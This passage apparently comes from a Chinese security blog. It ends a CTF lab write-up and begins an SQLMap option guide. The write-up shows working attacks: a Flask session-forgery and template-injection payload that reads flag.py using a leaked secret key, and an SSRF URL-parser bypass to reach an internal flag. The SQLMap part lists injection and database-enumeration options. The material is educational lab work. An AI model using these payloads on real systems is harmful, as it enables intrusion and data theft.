template=template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>在 pycharm 中搭建环境，通过阅读源码知目录下有 <code>flag.py</code>，直接访问发现没有权限。继续阅读源码，发现<code>n1page</code>方法中存在模板注入，但是存在过滤</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">	n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>不过在接下来的对 session[<code>n1code</code>] 仅仅是简单判定是否为空，可以利用 falsk 的 session 伪造实现注入。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; </span></span><br><span class="line"><span class="string">	&lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; </span></span><br><span class="line"><span class="string">	Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;?</span></span><br><span class="line"><span class="string">	 &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
<li><p>首先通过代码的逻辑，程序进入<code>n1page</code>方法，也就是访问<code>host/n1page</code>的时候，所以应该是抓访问<code>http://172.19.0.1:5000/n1page</code>的包。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr3_n1page_session.png" alt="afr3"></p>
</li>
<li><p>获取这个包的 session，然后使用解码函数解密，确定 session 字符串形式<code>&#123;&#39;n1code&#39;: None&#125;</code>，需要构造 payload 去替换 none。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 由于我是在 pycharm 运行，为了方便直接将 session 赋值给 payload</span></span><br><span class="line">    payload = <span class="string">&quot;eyJuMWNvZGUiOm51bGx9.YFVHSw.M_DdKDNd7WMbknyVKSDJ9Y25Z7Q&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(decryption(payload.encode()))</span><br><span class="line">    <span class="comment"># print(decryption(sys.argv[1].encode())) </span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>{‘n1code’: None}</p>
</blockquote>
</li>
<li><p>flask的 session 伪造需要一个密钥。接下来需要获得<code>SECRET_KEY</code>。在 server.py 源码中有执行 key.py 文件的操作，即<code>execfile(&#39;key.py&#39;)</code>，所以尝试直接访问<code>key.py</code>，成功获得内容：#!/usr/bin/python key = ‘Drmhze6EPcv0fN_81Bj-nA’</p>
</li>
<li><p>接下来是构造 payload。使用知识点中列的博文里的 payload 很多都失败了，我最终成功的形式：<code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()[40](\'flag.py\').read()&#125;&#125;&#39;&#125;&quot;</code>，使用<code>flask-session-cookie-manager</code>完整的命令形式：<code>python3 flask_session_cookie_manager3.py encode -s &quot;Drmhze6EPcv0fN_81Bj-nA&quot; -t &quot;&#123;&#39;n1code&#39; : &#39;&#123;&#123;[].__class__.__mro__[1].__subclasses__()[40](\'flag.py\').read()&#125;&#125;&#39;&#125;&quot;</code></p>
</li>
</ol>
<ul>
<li>flask-session-cookie-manager：Flask Session Cookie Decoder/Encoder，可以用来对 flask session cookie 编码/解码，实际上第10步也可以用这个来解码</li>
<li><code>Drmhze6EPcv0fN_81Bj-nA</code>，从 key.py 中获得的密钥</li>
<li>整个流程：1. 先对原始 session 解码获得 session 的形式  2. 获取<code>SECRET_KEY</code>  3. 构造 payload  4. 按照解码获得 session 的形式构造 session，再通过<code>flask-session-cookie-manager</code>使用 key 加密编码。</li>
</ul>
<ol start="13">
<li>将<code>flask-session-cookie-manager</code>获得的编码放到请求包的 session 中，再向服务器发送该包，成功获得 flag.py<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_afr_3_flag.png" alt="afr"></li>
</ol>
<h1 id="第二章-Web-进阶"><a href="#第二章-Web-进阶" class="headerlink" title="第二章 Web 进阶"></a>第二章 Web 进阶</h1><h2 id="2-1-SSRF漏洞"><a href="#2-1-SSRF漏洞" class="headerlink" title="2.1 SSRF漏洞"></a>2.1 SSRF漏洞</h2><ol>
<li><p> 进入环境，点击 intersting challenge，代码审计。更详细的代码审计可以看这篇<a href="https://blog.csdn.net/wuyaowangchuan/article/details/110433971">博客</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  <span class="comment"># 高亮显示当前文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="comment">// ^ 匹配行的开始</span></span><br><span class="line">    <span class="comment">// (xyz) 字符组，按照确切的顺序匹配字符 xyz</span></span><br><span class="line">    <span class="comment">// | 分支结构，匹配符号之前的字符或后面的字符</span></span><br><span class="line">    <span class="comment">// ? 	匹配前面的子表达式零次或一次，或指明一个非贪婪限定符</span></span><br><span class="line">    <span class="comment">// \ 转义符，它可以还原元字符原来的含义，允许你匹配保留字符 [ ] ( ) &#123; &#125; . * + ? ^ $ \ |</span></span><br><span class="line">    <span class="comment">// . 匹配除换行符以外的任意字符</span></span><br><span class="line">    <span class="comment">// * 匹配前面的子表达式零次或多次</span></span><br><span class="line">    <span class="comment">// $ 匹配行的结束</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>); </span><br><span class="line">        <span class="comment">// 分解出一个URL的各个部分，返回数组。这是 php 的方法，各种语言对 URL 各部分解析规则会各不一样</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();  <span class="comment"># 初始化</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);  <span class="comment">#  //抓取URL并把它传递给浏览器，实际上由于解析规则，获得的域名与 php parse_url 方法获得的不一样</span></span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close(<span class="variable">$ch</span>); </span><br><span class="line">        var_dump(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    safe_request_url(<span class="variable">$url</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>URL 都要经过 check_inner_ip 函数检测，但 php_url_parse 和 curl 对 url 的解析是不同的，强烈看看这篇文章 <a href="https://www.anquanke.com/post/id/86527">【Blackhat】SSRF的新纪元：在编程语言中利用URL解析器</a><br> <img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/%E4%BB%8E0%E5%88%B01%EF%BC%88CTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%EF%BC%89/wp_ssrf_1_url.png" alt="ssrf"></p>
</li>
<li><p>直接构造<code>?url=http://a@127.0.0.1:80@baidu.com/flag.php</code></p>
</li>
<li><p>后续还有 MySQL、Redies，我是跟着这个博客做的 <a href="https://blog.csdn.net/rfrder/article/details/108930033?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161604810616780255279438%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161604810616780255279438&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108930033.pc_search_result_cache&utm_term=%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5C">《从0到1：CTFer成长之路》 配套题目Web WP</a></p>
<ol>
<li>查看已经运行的docker镜像 <code>sudo docker ps -a</code></li>
<li>连接到mysql镜像中 <code>sudo docker exec -it 2-web-ssrf_mysql_1 bash</code>,2-web-ssrf_mysql_1 在上一步查看镜像时 NAMES 的内容。<a href="https://www.php.cn/docker/445365.html">怎么访问docker内的MySQL</a></li>
</ol>
<ul>
<li>将 docker 容器中的文件传递到主机:<code>sudo docker cp 2-web-ssrf_mysql_1:/pcap/mysql.pcap /home/chang/</code></li>
</ul>
</li>
</ol>
<h2 id="2-2-命令执行漏洞"><a href="#2-2-命令执行漏洞" class="headerlink" title="2.2 命令执行漏洞"></a>2.2 命令执行漏洞</h2><p>这道题主要是看博文，弄懂 linux文件描述符 和 反弹shell原理再看 writeup 基本上没什么难度了。</p>
<ul>
<li><a href="https://blog.csdn.net/rfrder/article/details/108930033?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161604810616780255279438%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161604810616780255279438&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108930033.pc_search_result_cache&utm_term=%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5C">《从0到1：CTFer成长之路》 配套题目Web WP</a></li>
<li><a href="https://www.cnblogs.com/LittleHann/p/12038070.html#_lab2_1_1">反弹Shell原理及检测技术研究</a></li>
<li><a href="https://cs-cshi.github.io/2021/03/23/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82%20Linux%20%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%88fd%EF%BC%89/">彻底弄懂 Linux 下的文件描述符（fd）</a></li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>CTF</category>
        <category>《从0到1：CTFer成长之路》</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>超详细SQLMap使用攻略及技巧分享</title>
    <url>/%E8%B6%85%E8%AF%A6%E7%BB%86SQLMap%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5%E5%8F%8A%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
<span id="more"></span>

<p>sqlmap 相关资源如下：</p>
<p>官方网站：<a href="http://sqlmap.org/%EF%BC%8C">http://sqlmap.org/，</a></p>
<p>下载地址：<a href="https://github.com/sqlmapproject/sqlmap/zipball/master">https://github.com/sqlmapproject/sqlmap/zipball/master</a></p>
<p>演示视频：<a href="https://asciinema.org/a/46601">https://asciinema.org/a/46601</a></p>
<p>教程：<a href="http://www.youtube.com/user/inquisb/videos">http://www.youtube.com/user/inquisb/videos</a></p>
<h2 id="1-1-sqlmap简介"><a href="#1-1-sqlmap简介" class="headerlink" title="1.1 sqlmap简介"></a>1.1 sqlmap简介</h2><p>sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。</p>
<p>sqlmap支持五种不同的注入模式：</p>
<ul>
<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li>
<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li>
<li>联合查询注入，可以使用union的情况下的注入；</li>
<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
</ul>
<h2 id="1-2-下载及安装"><a href="#1-2-下载及安装" class="headerlink" title="1.2 下载及安装"></a>1.2 下载及安装</h2><p>建议直接看 github：<a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
<p>You can download the latest tarball by clicking <a href="https://github.com/sqlmapproject/sqlmap/tarball/master">here</a> or latest zipball by clicking <a href="https://github.com/sqlmapproject/sqlmap/zipball/master">here</a>.</p>
<p>Preferably, you can download sqlmap by cloning the Git repository:</p>
<blockquote>
<p>git clone –depth 1 <a href="https://github.com/sqlmapproject/sqlmap.git">https://github.com/sqlmapproject/sqlmap.git</a> sqlmap-dev</p>
</blockquote>
<p>sqlmap works out of the box with Python version 2.6, 2.7 and 3.x on any platform.</p>
<h2 id="1-3-SQL使用参数详解"><a href="#1-3-SQL使用参数详解" class="headerlink" title="1.3 SQL使用参数详解"></a>1.3 SQL使用参数详解</h2><p>本文以SQLmap 1.1.8-8版本为例，对其所有参数进行详细的分析和讲解，便于在使用时进行查询。</p>
<p><code>sqlmap -hh</code> 列出参数说明</p>
<p>用法: sqlmap.py [选项]</p>
<h3 id="1-3-1-选项"><a href="#1-3-1-选项" class="headerlink" title="1.3.1 选项"></a>1.3.1 选项</h3><ul>
<li>-h,–help  显示基本帮助信息并退出</li>
<li>-hh    显示高级帮助信息并退出</li>
<li>–version  显示程序版本信息并退出</li>
<li>-vVERBOSE信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。</li>
</ul>
<h3 id="1-3-2-目标"><a href="#1-3-2-目标" class="headerlink" title="1.3.2 目标"></a>1.3.2 目标</h3><p>在这些选项中必须提供至少有一个确定目标</p>
<ul>
<li> -d DIRECT    直接连接数据库的连接字符串</li>
<li>-u URL, –url=URL   目标URL (e.g.”<a href="http://www.site.com/vuln.php?id=1&quot;)%EF%BC%8C%E4%BD%BF%E7%94%A8-u%E6%88%96%E8%80%85--url">http://www.site.com/vuln.php?id=1&quot;)，使用-u或者--url</a> </li>
<li>-l LOGFILE     从Burp或者WebScarab代理日志文件中分析目标</li>
<li>-x SITEMAPURL  从远程网站地图（sitemap.xml）文件来解析目标</li>
<li>-m BULKFILE      将目标地址保存在文件中，一行为一个URL地址进行批量检测。</li>
<li>-r REQUESTFILE   从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443</li>
<li>-g GOOGLEDORK     从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</li>
<li>-c CONFIGFILE       从配置ini文件中加载选项</li>
</ul>
<h3 id="1-3-3-请求"><a href="#1-3-3-请求" class="headerlink" title="1.3.3 请求"></a>1.3.3 请求</h3><p>这些选项可以用来指定如何连接到目标URL</p>
<ul>
<li>–method=METHOD  强制使用给定的HTTP方法（例如put）</li>
<li>–data=DATA   通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。–data=”id=1” -f –banner –dbs –users</li>
<li>–param-del=PARA..  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</li>
<li>–cookie=COOKIE     HTTP Cookieheader 值</li>
<li>–cookie-del=COO..  用来分隔cookie的字符串值</li>
<li>–load-cookies=L..  Filecontaining cookies in Netscape/wget format</li>
<li>–drop-set-cookie   IgnoreSet-Cookie header from response</li>
<li>–user-agent=AGENT  默认情况下sqlmap的HTTP请求头中User-Agent值是：sqlmap/1.0-dev-xxxxxxx(<a href="http://sqlmap.org)可以使用--user-agent参数来修改,同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt%E4%B8%AD%E8%8E%B7%E5%8F%96%E3%80%82%E5%BD%93--level%E5%8F%82%E6%95%B0%E8%AE%BE%E5%AE%9A%E4%B8%BA3%E6%88%96%E8%80%853%E4%BB%A5%E4%B8%8A%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E4%BC%9A%E5%B0%9D%E8%AF%95%E5%AF%B9User-Angent%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5">http://sqlmap.org)可以使用--user-agent参数来修改，同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt中获取。当--level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入</a></li>
<li>–random-agent     使用random-agent作为HTTP User-Agent头值</li>
<li>–host=HOST         HTTP Hostheader value</li>
<li>–referer=REFERER   sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</li>
<li>-H HEADER, –hea..  额外的http头(e.g.”X-Forwarded-For: 127.0.0.1”)</li>
<li>–headers=HEADERS  可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\nETag: 123”)</li>
<li>–auth-type=AUTH.. HTTP的认证类型 (Basic, Digest, NTLM or PKI)</li>
<li>–auth-cred=AUTH..  HTTP 认证凭证(name:password)</li>
<li>–auth-file=AUTH..  HTTP 认证PEM证书/私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</li>
<li>–ignore-401        Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）</li>
<li>–ignore-proxy      忽略系统的默认代理设置</li>
<li>–ignore-redirects忽略重定向的尝试</li>
<li>–ignore-timeouts   忽略连接超时</li>
<li>–proxy=PROXY       使用代理服务器连接到目标URL</li>
<li>–proxy-cred=PRO..  代理认证凭证(name:password)</li>
<li>–proxy-file=PRO..  从文件加载代理列表</li>
<li>–tor               使用Tor匿名网络</li>
<li>–tor-port=TORPORT  设置Tor代理端口</li>
<li>–tor-type=TORTYPE  设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))</li>
<li>–check-tor       检查Tor的是否正确使用</li>
<li>–delay=DELAY   可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</li>
<li>–timeout=TIMEOUT   可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。</li>
<li>–retries=RETRIES   当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</li>
<li>–randomize=RPARAM可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样</li>
<li>–safe-url=SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下</li>
<li>–safe-post=SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。</li>
<li>–safe-req=SAFER..  从文件中加载安全HTTP请求</li>
<li>–safe-freq=SAFE..  测试一个给定安全网址的两个访问请求</li>
<li>–skip-urlencode    跳过URL的有效载荷数据编码</li>
<li>–csrf-token=CSR..  Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌</li>
<li>–csrf-url=CSRFURL  URL地址访问提取anti-CSRF令牌</li>
<li>–force-ssl         强制使用SSL/HTTPS</li>
<li>–hpp               使用HTTP参数污染的方法</li>
<li>–eval=EVALCODE     在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。(e.g “import hashlib;id2=hashlib.md5(id).hexdigest()”)<ul>
<li>sqlmap.py -u”<a href="http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;--eval=&quot;import">http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot;--eval=&quot;import</a> hashlib;hash=hashlib.md5(id).hexdigest()”</li>
</ul>
</li>
</ul>
<h3 id="1-3-4-优化"><a href="#1-3-4-优化" class="headerlink" title="1.3.4 优化"></a>1.3.4 优化</h3><p>这些选项可用于优化sqlmap性能</p>
<ul>
<li>-o               打开所有的优化开关</li>
<li>–predict-output    预测普通查询输出</li>
<li>–keep-alive        使用持久HTTP（S）连接</li>
<li>–null-connection   获取页面长度</li>
<li>–threads=THREADS   当前http(s)最大请求数 (默认 1)</li>
</ul>
<h3 id="1-3-5-注入"><a href="#1-3-5-注入" class="headerlink" title="1.3.5 注入"></a>1.3.5 注入</h3><p>这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。</p>
<ul>
<li>-p TESTPARAMETER    可测试的参数</li>
<li>–skip=SKIP         跳过对给定参数的测试</li>
<li>–skip-static       跳过测试不显示为动态的参数</li>
<li>–param-exclude=..  使用正则表达式排除参数进行测试（e.g. “ses”）</li>
<li>–dbms=DBMS         强制后端的DBMS为此值</li>
<li>–dbms-cred=DBMS..  DBMS认证凭证(user:password)</li>
<li>–os=OS            强制后端的DBMS操作系统为这个值</li>
<li>–invalid-bignum    使用大数字使值无效</li>
<li>–invalid-logical   使用逻辑操作使值无效</li>
<li>–invalid-string    使用随机字符串使值无效</li>
<li>–no-cast          关闭有效载荷铸造机制</li>
<li>–no-escape         关闭字符串逃逸机制</li>
<li>–prefix=PREFIX     注入payload字符串前缀</li>
<li>–suffix=SUFFIX     注入payload字符串后缀</li>
<li>–tamper=TAMPER   使用给定的脚本篡改注入数据</li>
</ul>
<h3 id="1-3-6-检测"><a href="#1-3-6-检测" class="headerlink" title="1.3.6 检测"></a>1.3.6 检测</h3><p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容</p>
<ul>
<li>–level=LEVEL     执行测试的等级（1-5，默认为1）</li>
<li>–risk=RISK       执行测试的风险（0-3，默认为1）</li>
<li>–string=STRING    查询时有效时在页面匹配字符串</li>
<li>–not-string=NOT..  当查询求值为无效时匹配的字符串</li>
<li>–regexp=REGEXP     查询时有效时在页面匹配正则表达式</li>
<li>–code=CODE       当查询求值为True时匹配的HTTP代码</li>
<li>–text-only        仅基于在文本内容比较网页</li>
<li>–titles           仅根据他们的标题进行比较</li>
</ul>
<h3 id="1-3-7-技巧"><a href="#1-3-7-技巧" class="headerlink" title="1.3.7 技巧"></a>1.3.7 技巧</h3><p>这些选项可用于调整具体的SQL注入测试</p>
<ul>
<li>–technique=TECH    SQL注入技术测试（默认BEUST）</li>
<li>–time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）</li>
<li>–union-cols=UCOLS  定列范围用于测试UNION查询注入</li>
<li>–union-char=UCHAR  暴力猜测列的字符数</li>
<li>–union-from=UFROM  SQL注入UNION查询使用的格式</li>
<li>–dns-domain=DNS..  DNS泄露攻击使用的域名</li>
<li>–second-order=S..  URL搜索产生的结果页面</li>
</ul>
<h3 id="1-3-8-指纹"><a href="#1-3-8-指纹" class="headerlink" title="1.3.8 指纹"></a>1.3.8 指纹</h3><ul>
<li>-f, –fingerprint   执行广泛的DBMS版本指纹检查</li>
</ul>
<h3 id="1-3-9-枚举"><a href="#1-3-9-枚举" class="headerlink" title="1.3.9 枚举"></a>1.3.9 枚举</h3><p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。</p>
<ul>
<li>-a, –all           获取所有信息</li>
<li>-b, –banner        获取数据库管理系统的标识</li>
<li>–current-user      获取数据库管理系统当前用户</li>
<li>–current-db        获取数据库管理系统当前数据库</li>
